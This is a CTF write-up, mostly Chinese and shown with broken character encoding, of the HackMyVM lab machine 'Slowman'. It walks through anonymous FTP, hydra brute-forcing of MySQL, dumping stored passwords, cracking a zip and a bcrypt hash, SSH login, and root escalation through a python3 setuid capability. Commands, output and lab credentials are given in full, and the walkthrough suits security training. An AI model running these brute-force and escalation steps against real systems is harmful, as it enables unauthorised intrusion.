---
title: Slowman
author: hgbe02
date: 2024-04-04
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Slowman.html"
---

# slowman

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747929.png" alt="image-20240404160614613" style="zoom:50%;" />

## ä¿¡æ¯æœé›†

### ç«¯å£æ‰«æ

```bash
rustscan -a 10.0.2.19 -- -A
```

```css
Open 10.0.2.19:21
Open 10.0.2.19:22
Open 10.0.2.19:80
Open 10.0.2.19:3306

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:d6:5e:01:45:5b:8d:2d:f9:cb:0b:df:45:67:04:22 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHvpW3SN59DMldQfBCLaMEgh2QLtUL3x/uo4WbSqvUfGi6CTSzOxLuEt8h39LROAW2fc2MLF2hmQUW2rzxqs5tM=
|   256 f9:ce:4a:75:07:d0:05:1d:fb:a7:a7:69:39:1b:08:10 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIAknwJ/xf/gfMTW6Cv22rM+W5ubiFBKo3uaRTvZY544
80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Fastgym
3306/tcp open  mysql   syn-ack MySQL 8.0.35-0ubuntu0.22.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.35-0ubuntu0.22.04.1
|   Thread ID: 14
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, IgnoreSigpipes, Speaks41ProtocolOld, FoundRows, SupportsTransactions, SwitchToSSLAfterHandshake, ODBCClient, InteractiveClient, Speaks41ProtocolNew, LongPassword, Support41Auth, SupportsCompression, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x1D\x1E\\x06\x0DdYVy,aw\x1CVtTf}iu
|_  Auth Plugin Name: caching_sha2_password
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### ç›®å½•æ‰«æ

```bash
gobuster -u http://10.0.2.19 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```css
/images               (Status: 301) [Size: 307] [--> http://10.0.2.19/images/]
/css                  (Status: 301) [Size: 304] [--> http://10.0.2.19/css/]
/js                   (Status: 301) [Size: 303] [--> http://10.0.2.19/js/]
/server-status        (Status: 403) [Size: 274]
```

## æ¼æ´æŒ–æ˜

### è¸©ç‚¹

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747931.png" alt="image-20240404161018777" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747932.png" alt="image-20240404161039065" style="zoom: 33%;" />

### FTP

è¿æ¥ä¸€ä¸‹ftpæœåŠ¡ï¼Œç”¨æ‰«åˆ°çš„ä¿¡æ¯ï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~]
â””â”€$ ftp 10.0.2.19                    
Connected to 10.0.2.19.
220 (vsFTPd 3.0.5)
Name (10.0.2.19:kali): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43384|)
dir
^C
receive aborted. Waiting for remote to finish abort.
ftp> dir
229 Entering Extended Passive Mode (|||58910|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||60786|)
ftp: Can't connect to `10.0.2.19:60786': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              12 Nov 22 21:46 allowedusersmysql.txt
226 Directory send OK.
ftp> get allowedusersmysql.txt
local: allowedusersmysql.txt remote: allowedusersmysql.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for allowedusersmysql.txt (12 bytes).
100% |***************************************************************************************************************|    12        0.12 KiB/s    00:00 ETA
226 Transfer complete.
12 bytes received in 00:00 (0.12 KiB/s)
ftp> q
?Ambiguous command.
ftp> exit
221 Goodbye.
```

> å½“ä½ ä½¿ç”¨FTPï¼ˆæ–‡ä»¶ä¼ è¾“åè®®ï¼‰è¿æ¥åˆ°æŸä¸ªæœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå‘é€ä¸€ä¸ªæ¶ˆæ¯ï¼Œå‘Šè¯‰ä½ å®ƒæ­£åœ¨è¿›å…¥â€œExtended Passive Modeâ€ï¼ˆæ‰©å±•è¢«åŠ¨æ¨¡å¼ï¼‰ã€‚è¿™æ˜¯FTPåè®®çš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äºè§£å†³æŸäº›ç½‘ç»œç¯å¢ƒä¸­çš„è¿æ¥é—®é¢˜ã€‚
>
> ä¸ºäº†ç†è§£è¿™ä¸ªï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£FTPçš„ä¸¤ç§ä¸»è¦æ¨¡å¼ï¼šä¸»åŠ¨æ¨¡å¼ï¼ˆActive Modeï¼‰å’Œè¢«åŠ¨æ¨¡å¼ï¼ˆPassive Modeï¼‰ã€‚
>
> 1. **ä¸»åŠ¨æ¨¡å¼ï¼ˆActive Modeï¼‰**ï¼š
>    - å®¢æˆ·ç«¯æ‰“å¼€ä¸€ä¸ªç«¯å£å¹¶ç›‘å¬è¿™ä¸ªç«¯å£ï¼Œç­‰å¾…æœåŠ¡å™¨çš„è¿æ¥ã€‚
>    - æœåŠ¡å™¨ä½¿ç”¨å®¢æˆ·ç«¯æä¾›çš„IPåœ°å€å’Œç«¯å£å·æ¥ä¸»åŠ¨è¿æ¥å®¢æˆ·ç«¯ã€‚
>    - è¿™ç§æ–¹æ³•åœ¨æŸäº›é˜²ç«å¢™æˆ–NATï¼ˆç½‘ç»œåœ°å€è½¬æ¢ï¼‰ç¯å¢ƒä¸­å¯èƒ½ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºå®¢æˆ·ç«¯çš„IPåœ°å€å¯èƒ½ä¸æ˜¯å¤–éƒ¨å¯è®¿é—®çš„ã€‚
> 2. **è¢«åŠ¨æ¨¡å¼ï¼ˆPassive Modeï¼‰**ï¼š
>    - å®¢æˆ·ç«¯æ‰“å¼€ä¸€ä¸ªç«¯å£å¹¶å‘é€ä¸€ä¸ªPASVå‘½ä»¤ç»™æœåŠ¡å™¨ï¼Œè¯·æ±‚æœåŠ¡å™¨æä¾›ä¸€ä¸ªæ•°æ®ç«¯å£ã€‚
>    - æœåŠ¡å™¨åœ¨å…¶è‡ªå·±çš„IPåœ°å€ä¸Šæ‰“å¼€ä¸€ä¸ªç«¯å£ï¼Œå¹¶å‘Šè¯‰å®¢æˆ·ç«¯è¿™ä¸ªç«¯å£å·ã€‚
>    - å®¢æˆ·ç«¯ç„¶åè¿æ¥åˆ°è¿™ä¸ªç«¯å£æ¥ä¼ è¾“æ•°æ®ã€‚
>    - è¿™é€šå¸¸æ›´é€‚ç”¨äºæœ‰é˜²ç«å¢™æˆ–NATçš„ç¯å¢ƒï¼Œå› ä¸ºå®¢æˆ·ç«¯æ€»æ˜¯å‘èµ·è¿æ¥ã€‚
>
> **æ‰©å±•è¢«åŠ¨æ¨¡å¼ï¼ˆExtended Passive Modeï¼‰**æ˜¯è¢«åŠ¨æ¨¡å¼çš„ä¸€ä¸ªå˜ç§ï¼Œå®ƒå…è®¸æœåŠ¡å™¨æä¾›æ›´è¯¦ç»†çš„ç½‘ç»œåœ°å€ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯å½“æœåŠ¡å™¨ä½äºIPv6ç¯å¢ƒæˆ–éœ€è¦æä¾›æ›´å…·ä½“çš„ç½‘ç»œè·¯å¾„ä¿¡æ¯æ—¶ã€‚
>
> å½“ä½ çœ‹åˆ°â€œEntering Extended Passive Modeâ€çš„æ¶ˆæ¯æ—¶ï¼Œè¿™é€šå¸¸æ„å‘³ç€FTPæœåŠ¡å™¨æ­£åœ¨ä¸ºæ•°æ®ä¼ è¾“å‡†å¤‡ä¸€ä¸ªç«¯å£ï¼Œå¹¶å‡†å¤‡åœ¨æ‰©å±•è¢«åŠ¨æ¨¡å¼ä¸‹ä¸å®¢æˆ·ç«¯é€šä¿¡ã€‚è¿™é€šå¸¸æ˜¯ä¸ºäº†ç¡®ä¿æ›´å¯é å’Œçµæ´»çš„æ•°æ®ä¼ è¾“ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤æ‚çš„ç½‘ç»œç¯å¢ƒä¸­ã€‚
>
> è¿™é‡Œå¯ä»¥æ‰‹åŠ¨å¯åŠ¨passiveï¼Œç›´æ¥è¾“å…¥å³å¯ï¼Œç„¶åå°±å¯ä»¥å¾ˆå¿«è¯»å–äº†ã€‚

æ‰€ä»¥æ²¡å‡ºæ¥çš„è¯ä¸è¦æ€¥ï¼

```bash
cat allowedusersmysql.txt         
trainerjeff
```

æ„Ÿè§‰åƒæ˜¯mysqlçš„æ•°æ®åº“ç”¨æˆ·åï¼Œå°è¯•çˆ†ç ´ä¸€ä¸‹ï¼š

```bash
hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt mysql://10.0.2.19
```

ä¸ç®¡ä»–ï¼Œä¸¢åå°è·‘å»å§ï¼Œè´¼æ…¢çš„è¿™ä¸ªï¼Œå°è¯•ä¸€ä¸‹æ˜¯å¦æœ‰æ•æ„Ÿç›®å½•æ²¡å‘ç°ï¼š

```bash
ffuf -u http://10.0.2.19/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

```css
/images               (Status: 301) [Size: 307] [--> http://10.0.2.19/images/]
/css                  (Status: 301) [Size: 304] [--> http://10.0.2.19/css/]
/js                   (Status: 301) [Size: 303] [--> http://10.0.2.19/js/]
/server-status        (Status: 403) [Size: 274]
Progress: 220560 / 220561 (100.00%)
```

```bash
dirsearch -u http://10.0.2.19 -e* -i 200,300-399
```

```css
[04:24:59] Starting: 
[04:25:00] 301 -  303B  - /js  ->  http://10.0.2.19/js/
[04:25:16] 200 -    1KB - /contact.html
[04:25:17] 301 -  304B  - /css  ->  http://10.0.2.19/css/
[04:25:23] 200 -  809B  - /images/
[04:25:23] 301 -  307B  - /images  ->  http://10.0.2.19/images/
[04:25:24] 200 -  491B  - /js/
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747933.png" alt="image-20240404162630524" style="zoom:33%;" />

å¯èƒ½å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œå¯ä»¥å°è¯•xxsï¼Œä½†æ˜¯è¿™ä¸ªé¶åœºæ„Ÿè§‰ä¸æ˜¯è¿™ä¹ˆå¼„çš„ï¼Œè¦ä¹ˆæ‰¾åˆ°mysqlçš„å¯†ç ï¼Œè¦ä¹ˆçˆ†ç ´å‡ºæ¥ï¼Œhydraè¿˜åœ¨è·‘ï¼Œå»æœé›†ä¸€ä¸‹åˆ«çš„ä¿¡æ¯ï¼š

è¿™ä¸ªapacheç‰ˆæœ¬å°±ä¸åƒæ˜¯æƒ³è®©æˆ‘ä»¬åˆ©ç”¨ä¸­é—´ä»¶æ¼æ´è¿›è¡Œæ”»å‡»çš„ã€‚ã€‚ã€‚ã€‚

å»åšç‚¹åˆ«çš„äº‹æƒ…ï¼Œç­‰å¾…çˆ†ç ´å§ï¼Œæå®‰å…¨çš„è¦æœ‰è€å¿ƒï¼ˆç‹—å¤´.jpgï¼‰

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~]
â””â”€$ hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt mysql://10.0.2.19
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-04 04:21:47
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking mysql://10.0.2.19:3306/
[STATUS] 12.00 tries/min, 12 tries in 00:01h, 14344387 to do in 19922:46h, 4 active
[STATUS] 12.00 tries/min, 36 tries in 00:03h, 14344363 to do in 19922:44h, 4 active
[STATUS] 12.00 tries/min, 84 tries in 00:07h, 14344315 to do in 19922:40h, 4 active
[STATUS] 12.00 tries/min, 180 tries in 00:15h, 14344219 to do in 19922:32h, 4 active
[STATUS] 12.00 tries/min, 372 tries in 00:31h, 14344027 to do in 19922:16h, 4 active
[3306][mysql] host: 10.0.2.19   login: trainerjeff   password: soccer1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-04 05:06:10
```

å¾—åˆ°äº†è´¦å·å¯†ç ï¼š

```apl
trainerjeff
soccer1
```

ä¹Ÿå¯ä»¥ä½¿ç”¨`-V`å’Œ`-I`ç›´è§‚ä¸€ç‚¹ï¼Œé˜²æ­¢hydraå·æ‡’ï¼Œç‹—å¤´.jpg

> - `-V`ï¼šæ­¤å‚æ•°åœ¨Hydraä¸­ç”¨äºæ˜¾ç¤ºè¯¦ç»†çš„æ‰§è¡Œè¿‡ç¨‹ã€‚å½“ä½ ä½¿ç”¨è¿™ä¸ªå‚æ•°æ—¶ï¼ŒHydraä¼šè¾“å‡ºæ›´å¤šçš„ä¿¡æ¯ï¼Œå¸®åŠ©ä½ äº†è§£å·¥å…·åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­çš„å…·ä½“æ­¥éª¤å’ŒçŠ¶æ€ã€‚
> - `-I`ï¼šæ­¤å‚æ•°ç”¨äºæŒ‡å®šå•ä¸ªç”¨æˆ·åã€‚åœ¨ä½ çŸ¥é“ç›®æ ‡ç³»ç»Ÿçš„æŸä¸ªç”¨æˆ·åï¼Œå¹¶å¸Œæœ›å°è¯•çˆ†ç ´å…¶å¯†ç æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªå‚æ•°ã€‚é€šè¿‡æŒ‡å®šç”¨æˆ·åï¼ŒHydraä¼šé’ˆå¯¹è¿™ä¸ªç”¨æˆ·åå°è¯•ç ´è§£å¯†ç ã€‚

### è¿æ¥æ•°æ®åº“

```bash
mysql -u trainerjeff -h 10.0.2.19 -p
soccer1
```

æŸ¥è¯¢ä¸€ä¸‹ä¿¡æ¯ï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~]
â””â”€$ mysql -u trainerjeff -h 10.0.2.19 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 1117
Server version: 8.0.35-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| trainers_db        |
+--------------------+
5 rows in set (0.103 sec)

MySQL [(none)]> use trainers_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [trainers_db]> show tables;
+-----------------------+
| Tables_in_trainers_db |
+-----------------------+
| users                 |
+-----------------------+
1 row in set (0.002 sec)

MySQL [trainers_db]> select * from users
    -> ;
+----+-----------------+-------------------------------+
| id | user            | password                      |
+----+-----------------+-------------------------------+
|  1 | gonzalo         | tH1sS2stH3g0nz4l0pAsSWW0rDD!! |
|  2 | $SECRETLOGINURL | /secretLOGIN/login.html       |
+----+-----------------+-------------------------------+
2 rows in set (0.001 sec)
```

å¾—åˆ°ä¸¤ä¸ªä¸œè¥¿ï¼š

```bash
/secretLOGIN/login.html  		# ç™»å½•åœ°å€
gonzalo  						# ç”¨æˆ·
tH1sS2stH3g0nz4l0pAsSWW0rDD!!	# å¯†ç 
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747934.png" alt="image-20240404171301994" style="zoom:33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747935.png" alt="image-20240404171333860" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747936.png" alt="image-20240404171351918" style="zoom: 33%;" />

æŸ¥çœ‹ä¸€ä¸‹ä¸‹è½½çš„ä¸œè¥¿ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747937.png" alt="image-20240404171444342" style="zoom:50%;" />

éœ€è¦å¯†ç ã€‚ã€‚ã€‚ã€‚ã€‚

### çˆ†ç ´å‹ç¼©åŒ…å¯†ç 

ä½¿ç”¨linuxä¸Šçš„å·¥å…·`fcrackzip`è¿›è¡Œçˆ†ç ´ï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/Downloads]
â””â”€$ fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u credentials.zip


PASSWORD FOUND!!!!: pw == spongebob1
```

ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹å“¦ï¼š

| å‚æ•° |                           ä½œç”¨                            |
| :--: | :-------------------------------------------------------: |
|  -b  |                       æš´åŠ›ç ´è§£æ–¹å¼                        |
|  -D  |                       å­—å…¸ç ´è§£æ–¹å¼                        |
|  -c  | æš´åŠ›ç ´è§£çš„å­—ç¬¦ç±»å‹ï¼Œ1=1\~9,a=a\~z,A=A~Z,!=å­—ç¬¦,:=æ‰€æœ‰å­—ç¬¦ |
|  -v  |                å•°å—¦æ¨¡å¼ï¼Œæ˜¾ç¤ºå®æ—¶çˆ†ç ´ä¿¡æ¯                 |
|  -l  |                  æŒ‡å®šç ´è§£çš„å¯†ç ä¸ºå‡ ä½æ•°                   |
|  -u  |                       æŒ‡å®šçˆ†ç ´æ–‡ä»¶                        |
|  -p  |                      ç ´è§£çš„èµ·å§‹ä½ç½®                       |

å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨`ARCHPR`ç­‰å…¶ä»–å·¥å…·è¿›è¡Œçˆ†ç ´ï¼

æå–ä¸€ä¸‹æ–‡ä»¶å†…å®¹ï¼š

```bash
â”Œâ”€â”€(kaliğŸ’€kali)-[~/Downloads]
â””â”€$ unzip credentials.zip 
Archive:  credentials.zip
[credentials.zip] passwords.txt password: 
  inflating: passwords.txt           
                                                                                                                                                            
â”Œâ”€â”€(kaliğŸ’€kali)-[~/Downloads]
â””â”€$ cat passwords.txt                 
----------
$USERS: trainerjean

$PASSWORD: $2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq 
---------- 
```

### hashçˆ†ç ´

hashçˆ†ç ´ä¸€ä¸‹ï¼š

```apl
trainerjean
$2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq
```

```bash
echo '$2y$10$DBFBehmbO6ktnyGyAtQZNeV/kiNAE.Y3He8cJsvpRxIFEhRAUe1kq' > hash.txt
john --wordlist /usr/share/wordlists/rockyou.txt hash.txt
```

> åŒå¼•å·æœ‰äº›å­—ç¬¦ä¼šè¢«è§£é‡Šï¼Œè€Œå•å¼•å·ä¸ä¼šï¼

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747938.png" alt="image-20240404173308578" style="zoom: 33%;" />

å¾—åˆ°ç”¨æˆ·ï¼š

```apl
trainerjean
tweety1
```

å°è¯•sshè¿æ¥ï¼š

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747939.png" alt="image-20240404173433875" style="zoom:50%;" />

æˆåŠŸï¼

## ææƒ

### ä¿¡æ¯æœé›†

```bash
(remote) trainerjean@slowman:/home/trainerjean$ whoami;id
trainerjean
uid=1002(trainerjean) gid=1002(trainerjean) groups=1002(trainerjean)
(remote) trainerjean@slowman:/home/trainerjean$ sudo -l
[sudo] password for trainerjean: 
Sorry, user trainerjean may not run sudo on slowman.
(remote) trainerjean@slowman:/home/trainerjean$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
trainerjeff:x:1001:1001:trainerjeff,,,:/home/trainerjeff:/bin/bash
trainerjean:x:1002:1002:trainerjean,,,:/home/trainerjean:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
gonzalo:x:1003:1003:gonzalo,,,:/home/gonzalo:/bin/bash
ftp:x:115:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
(remote) trainerjean@slowman:/home/trainerjean$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Is a directory
(remote) trainerjean@slowman:/home/trainerjean$ find / -perm -u=s -type f 2>/dev/null
/snap/core20/2015/usr/bin/chfn
/snap/core20/2015/usr/bin/chsh
/snap/core20/2015/usr/bin/gpasswd
/snap/core20/2015/usr/bin/mount
/snap/core20/2015/usr/bin/newgrp
/snap/core20/2015/usr/bin/passwd
/snap/core20/2015/usr/bin/su
/snap/core20/2015/usr/bin/sudo
/snap/core20/2015/usr/bin/umount
/snap/core20/2015/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2015/usr/lib/openssh/ssh-keysign
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/snapd/20290/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/bin/mount
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/umount
/usr/libexec/polkit-agent-helper-1
(remote) trainerjean@slowman:/home/trainerjean$ ls -la
total 32
drwxr-x--- 3 trainerjean trainerjean 4096 nov 23 21:44 .
drwxr-xr-x 5 root        root        4096 nov 23 21:23 ..
lrwxrwxrwx 1 root        root           9 nov 23 21:22 .bash_history -> /dev/null
-rw-r--r-- 1 trainerjean trainerjean  220 nov 22 19:29 .bash_logout
-rw-r--r-- 1 trainerjean trainerjean 3771 nov 22 19:29 .bashrc
drwx------ 2 trainerjean trainerjean 4096 nov 22 19:30 .cache
-rw-r--r-- 1 trainerjean trainerjean  807 nov 22 19:29 .profile
-rw------- 1 trainerjean trainerjean   77 nov 23 21:44 .python_history
-rw-r--r-- 1 root        root          29 nov 23 19:52 user.txt
(remote) trainerjean@slowman:/home/trainerjean$ cat user.txt 
YOU9et7HEpA$SwordofS10wMan!!
(remote) trainerjean@slowman:/home/trainerjean$ cat .python_history 
import os
os.system('bash')
os.system('0')
os.setid('0')
os.setuid('0')
exit
(remote) trainerjean@slowman:/home/trainerjean$ python3 -c "import os; os.system('/bin/bash')"
trainerjean@slowman:~$ id
uid=1002(trainerjean) gid=1002(trainerjean) groups=1002(trainerjean)
trainerjean@slowman:~$ python3 -c "import os; os.setid('0'); os.setuid('0');os.system('/bin/bash')"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
AttributeError: module 'os' has no attribute 'setid'. Did you mean: 'setgid'?
trainerjean@slowman:~$ python3 -c "import os; os.setuid('0'); os.system('/bin/bash')"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
TypeError: uid should be integer, not str
trainerjean@slowman:~$ python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
root@slowman:~# whoami;id
root
uid=0(root) gid=1002(trainerjean) groups=1002(trainerjean)
```

è¿™é‡Œçš„pythonçœ‹æ¥æ˜¯æœ‰ç‰¹æ®Šæƒé™åœ¨èº«ä¸Šï¼Œå¯ä»¥è®¾ç½®uidï¼æˆ‘ä»¬ä¼ ä¸€ä¸ª`linpeas.sh`åˆ†æä¸€ä¸‹ï¼š

```bash
root@slowman:~# lsof /usr/bin/python3
COMMAND    PID        USER  FD   TYPE DEVICE SIZE/OFF NODE NAME
networkd-  723        root txt    REG  253,0  5913032  936 /usr/bin/python3.10
unattende  769        root txt    REG  253,0  5913032  936 /usr/bin/python3.10
python3   1515 trainerjean txt    REG  253,0  5913032  936 /usr/bin/python3.10
python3   1529        root txt    REG  253,0  5913032  936 /usr/bin/python3.10
root@slowman:~# ls -l /usr/bin/python3
lrwxrwxrwx 1 root root 10 ago 18  2022 /usr/bin/python3 -> python3.10
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404041747940.png" alt="image-20240404174454925" style="zoom:50%;" />

åŸæ¥æ˜¯pythonå…·æœ‰`capabilities`æƒé™ï¼Œè¿™ç§æƒé™å¯ä»¥ç”¨æ¥ææƒä¸Šä¸€æ¬¡è¿˜æ˜¯ä¸€ä¸ª`php8.1`çš„`capabilities`ææƒã€‚

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼šhttps://gtfobins.github.io/gtfobins/python/

